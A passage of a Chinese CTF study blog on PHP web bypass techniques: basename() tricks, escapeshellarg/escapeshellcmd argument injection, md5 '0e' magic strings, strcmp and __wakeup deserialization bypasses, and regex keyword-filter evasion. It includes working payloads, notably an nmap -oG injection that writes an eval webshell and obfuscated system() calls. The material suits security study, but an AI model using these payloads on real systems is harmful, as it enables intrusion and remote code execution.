<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$path</span> = <span class="string">&quot;/test/home.php&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>);		<span class="comment">//显示带有文件扩展名的文件名 home.php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);<span class="comment">//显示不带有文件扩展名的文件名 home</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	<strong>绕过原理</strong> ：在使用默认语言环境设置时，basename()会删除文件名开头的非 ASCII 字符(大致意思是这个)出自：<a href="https://bugs.php.net/bug.php?id=62119">basename broken with non-ASCII-chars</a>报告</p>
<p>用脚本跑一下测试有哪些字符会被basename()删除 <a href="https://darkwing.moe/2020/03/10/Can-you-guess-it-zer0pts-CTF-2020/?utm_source=tuicool&utm_medium=referral">脚本来源</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">255</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="string">&#x27;/index.php/config.php/&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">check</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$t</span> = <span class="title function_ invoke__">basename</span>(<span class="string">&#x27;/index.php/config.php/&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;$&#123;i&#125;: $&#123;t&#125;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	发现ASCII码值为128-255 的字符均可以绕过basename()，所以可以利用 <strong>这些不可见字符污染字符串</strong> 来绕过basename()，看了别人的WP知道还有 <strong>中文字符</strong> 也可以绕过也可以绕过，例如：<strong>汉字、？、《、》、；</strong>等中文字符</p>
<p>参考：<a href="https://www.cnblogs.com/yesec/p/15429527.html">basename()绕过小结</a></p>
<p>**[Zer0pts2020]Can you guess it?**：</p>
<p>​	查看源码发现flag就在 config.php 中，先利用 basename 函数来显示 config.php页面，如：<code>/index.php/config.php</code> ；之后就是绕过正则表达式，正则匹配了 <code>config.php/</code> ，所以我们要在其后面加上 不可见字符污染字符串，如：config.php&#x2F;%ff（%80~%ff都可以，十六进制），最后点击 <strong>Source</strong> 即可</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-10.jpg" alt="002-php-10"></p>
<h2 id="escapeshell-arg-cmd"><a href="#escapeshell-arg-cmd" class="headerlink" title="escapeshell(arg+cmd)"></a>escapeshell(arg+cmd)</h2><p>​	这两个函数单独出现的话不会有影响，可如果他们一起使用的话就会出现一些问题</p>
<ul>
<li><p>escapeshellarg：把字符串转义为可以在 shell 命令里使用的参数</p>
<p>​	给字符串整体加一个单引号并且引用或转义任何已经存在的单引号（即若字符串中有单引号时先对单引号转义，再用单引号将左右两部分括起来）</p>
</li>
<li><p>escapeshellcmd：转义 字符串中可能会欺骗 shell 执行任意命令的字符</p>
<p>\x0A \xFF &amp; # ;&#96;|*?~&lt;&gt;^()[]{}$\ 这些字符会被转义，’ 和 “ 仅在不配对时被转义</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;curl &quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>传入的参数是：<code>127.0.0.1&#39; -v -d a=1</code></p>
</li>
<li><p>经过 escapeshellarg 处理后变成了 <code>&#39;127.0.0.1&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用</p>
</li>
<li><p>经过 escapeshellcmd 处理后变成 <code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，escapeshellcmd对 \ 和最后那个<strong>不配对的引号</strong>进行了转义</p>
</li>
<li><p>最后执行的命令是 <code>curl &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于 <code>\\</code> 被解释为 \ 而不是转义字符，所以后面的 ‘ 没有被转义，与再后面的 ‘ 配对成了一个空白连接符</p>
<blockquote>
<p>-d, –data <data>          HTTP POST data</p>
<p>所以等价为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code>，先向127.0.0.1\发起请求，再用 POST方式传参a&#x3D;1’</p>
<p>简单的来说就是没有考虑到单引号的问题，两次转义后出现了问题</p>
</blockquote>
</li>
</ol>
<p><strong>[BUUCTF 2018]Online Tool 1</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);	<span class="comment">//用于创建目录</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);	<span class="comment">//改变当前目录</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure>

<p>​	nmap有一个参数 -oG 可以实现将命令和结果写到文件，所以我们可以控制自己的输入写入文件，所以我们可以写入一句话木马，构造的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?host=&#x27;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇 </a></p>
<p><a href="https://xz.aliyun.com/t/2501#toc-1">代码审计Day5 - escapeshellarg与escapeshellcmd使用不当</a></p>
<p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">BUUCTF 2018 Online Tool</a></p>
<h1 id="弱类型绕过"><a href="#弱类型绕过" class="headerlink" title="弱类型绕过"></a>弱类型绕过</h1><p>​	弱类型是可以随意转换变量的类型。也就是说 PHP 并不会验证变量的类型，可以随时地转换类型</p>
<p>&#x3D;&#x3D;：先将 前后两个变量的类型 转化相同，再比较</p>
<p>&#x3D;&#x3D;&#x3D;：先判断 前后两个变量的类型 是否相等，再比较</p>
<p>​	若比较 数字 和 字符串 或者 涉及到数字内容的字符串，则字符串会被转换成 数值 与 数字 进行比较。但是在php中 字符 或 字符串 不能转换成数字(会转换失败)。php中大概有三、四种方法将 字符串 转换成 数字：number_format()函数、直接进行类型转换、使用 intval()等函数转换、执行数学运算实现转换。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;123violet456&#x27;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">number_format</span>(<span class="variable">$a</span>),<span class="string">&quot;\n&quot;</span>;	<span class="comment">//123</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="keyword">int</span>)<span class="variable">$a</span>,<span class="string">&quot;\n&quot;</span>;		<span class="comment">//123</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>),<span class="string">&quot;\n&quot;</span>;	<span class="comment">//123</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	当一个字符串当作一个数值来取值，其结果和类型如下：如果该字符串没有包含 ’.’、’e’、’E’ 并且 数值在 int  的范围内，该字符串被当作 int 来取值，其余所有情况下都被作为 float 来取值。该字符串的开始部分决定了它的值，如果该字符串以合法的 数值 开始，则使用该数值， 否则其值为 0 (PHP规定)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;violet123&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="keyword">int</span>)<span class="variable">$a</span>,<span class="string">&quot;\n&quot;</span>;	<span class="comment">//0</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>),<span class="string">&quot;\n&quot;</span>;	<span class="comment">//0</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&quot;%53&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>);	<span class="comment">// 0    </span></span><br><span class="line">	<span class="comment">// 其余特殊符号除去 + - 外，转化成数字时都同上直接为0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	也就是说 如果不是科学计数法形式的字符串，字符串只有两种方式 int 和 float 进行取值，以数字开头的话，只显示连续的数字其余字符不予显示；以字符开头的话，直接显示0 (特殊符号除 <code>+、-</code> 外也适用)</p>
<blockquote>
<p>若一个字符串为 合法数字 + e + 合法数字，将会解释为科学计数法</p>
<p>若一个字符串为 合法数字 + 非数字的字符串 ，将会被转换为该合法数字的值，后面的字符串将会被丢弃 </p>
<p>若一个字符串为 非数字的字符串 + 任意，则被转换为0 (除 + - 外)</p>
</blockquote>
<h2 id="md5相等绕过"><a href="#md5相等绕过" class="headerlink" title="md5相等绕过"></a><strong>md5相等绕过</strong></h2><p>​	0e 在比较的时候会将其视作为<strong>科学计数法</strong>，所以无论 0e 后面是什么，0的多少次方还是0，也就是说：md5(‘s878926199a’) &#x3D;&#x3D; md5(‘DQWRASX ‘)为真。以下是 md5值包含0e的 原字符串 及其md5值</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">s1836677006a</span><br><span class="line">	0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">	0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">	0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">	0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">	0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">	0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">	0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">240610708 </span><br><span class="line">	0e462097431906509019562988736854</span><br><span class="line">314282422 </span><br><span class="line">	0e990995504821699494520356953734</span><br><span class="line">571579406 </span><br><span class="line">	0e972379832854295224118025748221</span><br><span class="line">903251147 </span><br><span class="line">	0e174510503823932942361353209384</span><br><span class="line">1110242161 </span><br><span class="line">	0e435874558488625891324861198103</span><br><span class="line">1320830526 </span><br><span class="line">	0e912095958985483346995414060832</span><br><span class="line">1586264293 </span><br><span class="line">	0e622743671155995737639662718498</span><br><span class="line"></span><br><span class="line">QLTHNDT </span><br><span class="line">	0e405967825401955372549139051580</span><br><span class="line">QNKCDZO </span><br><span class="line">	0e830400451993494058024219903391</span><br><span class="line">EEIZDOI </span><br><span class="line">	0e782601363539291779881938479162</span><br><span class="line">TUFEPMC </span><br><span class="line">	0e839407194569345277863905212547</span><br><span class="line">UTIPEZQ </span><br><span class="line">	0e382098788231234954670291303879</span><br><span class="line">UYXFLOI </span><br><span class="line">	0e552539585246568817348686838809</span><br><span class="line">IHKFRNS </span><br><span class="line">	0e256160682445802696926137988570</span><br></pre></td></tr></table></figure>

<p>​	md5()无法处理数组，如果出现 强比较(&#x3D;&#x3D;&#x3D;) 的话，md5返回的值为False，使得 Flase&#x3D;&#x3D;&#x3D;False等式成立</p>
<p>当上述情况无法凑效时，用fastcoll 生成两个MD5值相同但内容不同的文件(URL编码后可以绕过md5强比较)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p test.txt -o 1.txt 2.txt</span><br><span class="line">		-p:给定需要计算的文件</span><br><span class="line">		-o:指定输出到两个文件中(可以不写)</span><br><span class="line">直接将需计算的文件拖到 fastcoll_v1.0.0.5.exe 也可执行	</span><br></pre></td></tr></table></figure>

<p>以下是md5值前后相等的,即 a&#x3D;md5(a)这种类型的(a代表原始的值)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">	0e291242476940776845150308577824</span><br></pre></td></tr></table></figure>

<h2 id="strcmp绕过"><a href="#strcmp绕过" class="headerlink" title="strcmp绕过"></a>strcmp绕过</h2><blockquote>
<p>适用版本：PHP≤5.3</p>
</blockquote>
<p>​	<code>strcmp($str1,$str2)</code> ，比较字符串的函数，相等则返回0，在5.3之前，若传入的是数组就会报错，并且return 0，而相等返回的结果也是0，所以我们可以用<strong>数组</strong>进行绕过</p>
<p><strong>[极客大挑战 2019]BuyFlag</strong>：</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-04.jpg"></p>
<p>​	这里貌似用到了 strcmp函数限制了变量的长度，不允许输入太长的字符串，而money不够却又买不到flag</p>
<ul>
<li>可以用 科学计数法绕过： <code>money=1e9</code>，表示 1x10⁹</li>
<li>也可以用 数组绕过：<code>money[]=1</code></li>
</ul>
<h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><ol>
<li><p>对象：系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位</p>
<p>对象 的抽象是 类，类 的具体化就是 对象，也可以说类的实例是对象（实际存在的）</p>
</li>
<li><p>类：具有相同特性（数据元素）和行为（功能）的一组对象的集合</p>
<p>一种数据类型，它定义了一个 对象 的属性和方法，类具有属性，是 对象 状态的抽象（一种概念）</p>
</li>
</ol>
<p>将 类名 与 变量名 以字符串的形式保存起来，反序列化 就是其逆过程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span> , <span class="string">&#x27;pass&#x27;</span> =&gt; <span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);	<span class="comment">//将这个 数组 序列化 a:1:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line">=====================================================================================</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span>																				</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个 对象 序列化 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span></span><br><span class="line">=====================================================================================</span><br><span class="line"></span><br><span class="line"><span class="comment">//	O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;		a:1:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"><span class="comment">//	对象类型:长度:&quot;类名&quot;:类中变量的个数:&#123;类型:长度:&quot;值&quot;;类型:长度:&quot;值&quot;;......&#125;</span></span><br><span class="line"><span class="comment">//	对象类型:a-array数组		O-class		s-string字符串类型</span></span><br></pre></td></tr></table></figure>

<p>当 字符串 反序列化出现问题时，可以加上base64_encode()</p>
<p>当 <strong>private</strong> 声明的字段在序列化时：</p>
<ul>
<li>private声明的字段为私有字段，只在所声明的类中可见，在 该类的子类 和 该类的对象实例 中均不可见</li>
<li>故私有字段的字段名在序列化时， 类名 和 字段名 前面加上 <code>%00</code> </li>
<li><strong>protected</strong> 声明的字段要在 字段名 前加上 <code>%00*</code> (字段名：类下声明的变量)</li>
</ul>
<p>常见 PHP 魔术方法</p>
<blockquote>
<p><code>__construct()</code> ：当类新建对象的时候会执行，例如，$x &#x3D; new Demo(要传给函数的值)<br><code>__destruct()</code> ：当对象销毁后会调用（也就是说 此函数在最后被调用）<br><code>__wakeup()</code> ：当执行反序列化函数的时候会先执行wakeup函数<br><code>highlight_file()</code> ：高亮显示指定PHP文件的代码</p>
<p><code>__invoke()</code>：在类的对象被调用为函数时候，自动被调用<br><code>__toString()</code>：在类的对象被当作字符串操作的时候，自动被调用<br><code>__wakeup()</code> ：在类的对象反序列化的时候，自动被调用<br><code>__construct()</code>：在类的对象实例化之前，自动被调用<br><code>__get()</code>：从不可访问的属性中读取数据会触发（访问类中一个不存在的属性时自动调用）</p>
</blockquote>
<h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup()绕过"></a>__wakeup()绕过</h2><p>​	当 反序列化 的时候，会检查是否存在 <code>__wakeup()</code>函数，如果存在的话，序列化之后优先调用此函数。</p>
<p>​	这个函数漏洞就是与<strong>对象的属性个数</strong>有关。如果序列化后的字符串中 表示属性个数的数字与真实属性个数一致，那么就调用 <code>__wakeup()函数</code>，如果 该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
<ul>
<li>简单来说，修改 对象的属性变量个数 即可（一般大于原数）</li>
</ul>
<p><strong>Web_php_unserialize：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; 	<span class="comment">//[oc]:匹配o c中的任意一个字符</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>=<span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$a</span>); <span class="comment">//绕过preg_match()函数</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$a</span>);  <span class="comment">//绕过__wakeup()函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);          <span class="comment">//绕过解码函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	这里不能将 序列化后的 字符串 复制下来手动添加 <code>+</code> 和 改变对象属性个数再 base64 编码</p>
<p>​	用在线的PHP网站来反序列化后，输出乱码(可恶，VSCode上就可以)，或许可能与这有关(输出的字符串 并非 实际的字符串，虽然我也不太懂)<a href="https://www.toolnb.com/tools/phpserialize.html">PHP序列化和反序列化 - 爱资料工具 </a></p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-05.jpg"></p>
<p>​	<strong>var_dump()</strong> ：显示关于一个或多个表达式的结构信息。数组将递归展开值，通过缩进显示其结构</p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>​	使用单个字符串来描述、匹配一系列符合某个句法规则的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/g:表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个,如果不加/g最多只会匹配一个</span><br><span class="line">/i:表示匹配的时候不区分大小写</span><br><span class="line">/m:表示多行匹配(匹配换行符两端的潜在匹配),影响正则中的^$符号</span><br><span class="line">/s:与/m相对,单行模式匹配</span><br><span class="line">/e:可执行模式(可导致PHP代码执行),此为PHP专有参数，例如preg_replace函数</span><br><span class="line">/x:忽略空白模式</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>匹配除换行符的所有字符</td>
</tr>
<tr>
<td>\d</td>
<td>匹配数字</td>
</tr>
<tr>
<td>\D</td>
<td>匹配除去数字的字符</td>
</tr>
<tr>
<td>\w</td>
<td>匹配文字字符，英语或中文都行</td>
</tr>
<tr>
<td>\W</td>
<td>匹配非文字字符</td>
</tr>
<tr>
<td>\s</td>
<td>匹配空白符(包含 Tab 和 换行符)</td>
</tr>
<tr>
<td>\S</td>
<td>匹配非空白符</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串的开始</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串的结束</td>
</tr>
<tr>
<td>(a | b)</td>
<td>匹配 a 或者 b</td>
</tr>
<tr>
<td>(ab) | (cd)</td>
<td>匹配 ab 或者 cd</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>?</td>
<td>最多匹配前面的字符一次（0或1）</td>
</tr>
<tr>
<td>*</td>
<td>至少匹配前面的字符零次（&gt;&#x3D;0）</td>
</tr>
<tr>
<td>+</td>
<td>至少匹配前面的字符一次（&gt;&#x3D;1）</td>
</tr>
<tr>
<td>{n}</td>
<td>匹配前面的字符 n 次，换言之：匹配前面 n 个字符</td>
</tr>
<tr>
<td>{n,}</td>
<td>匹配前面的字符最少 n 次</td>
</tr>
<tr>
<td>{n,m}</td>
<td>匹配前面的字符最少 n 次，最多 m 次</td>
</tr>
</tbody></table>
<p>​	方括号  [ ]  表示要匹配的几种类型的字符，如：[abc]  可以匹配 a、b、c 任意一字符，等价于 [a-c]；[123] 可以匹配 1、2、3 任意一字符。在 [] 中的<code>.</code>失去原来的意义(匹配除换行符以外的所有字符)，无需转义。若在 [ ] 中有 <code>^</code>，则为 非 的意思，在其他地方表示 字符串的开始</p>
<ul>
<li>贪婪模式：在整个表达式匹配成功的前提下，尽可能<strong>多</strong>地 匹配字符</li>
<li>非贪婪模式：同上的前提下，尽可能<strong>少</strong>地 匹配字符，可在表示数量的标识符后输入 <code>?</code> 来开启非贪婪模式，如<code>*?</code>、<code>+? </code>、<code>??</code></li>
</ul>
<h1 id="正则表达式绕过"><a href="#正则表达式绕过" class="headerlink" title="正则表达式绕过"></a>正则表达式绕过</h1><p>​	做CTF时遇到了使用正则表达式 过滤了所有的英文字母和数字 或者 过滤一些关键字等等，以下是收集的一些绕过方法</p>
<h2 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h2><blockquote>
<p>适用版本：PHP&gt;&#x3D;7，适用于绕过 过滤具体关键字</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo|system/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No Hack!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	类似像这样过滤了关键字，虽然可以用passthru()等函数代替，但只要加上黑名单就无从下手</p>
<p>网上的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(p.hpinfo)();</span><br><span class="line">(p.h.(pi).n.f.o)();</span><br><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line"></span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="字符串编码绕过"><a href="#字符串编码绕过" class="headerlink" title="字符串编码绕过"></a>字符串编码绕过</h2><blockquote>
<p>适用PHP版本：PHP&gt;&#x3D;7</p>
</blockquote>
<p>​	同上面的情况，过滤了关键字后，我们还可以使用 该字符串的八进制、十六进制、unicode等编码方式绕过</p>
<p>网上的处理脚本如下：</p>
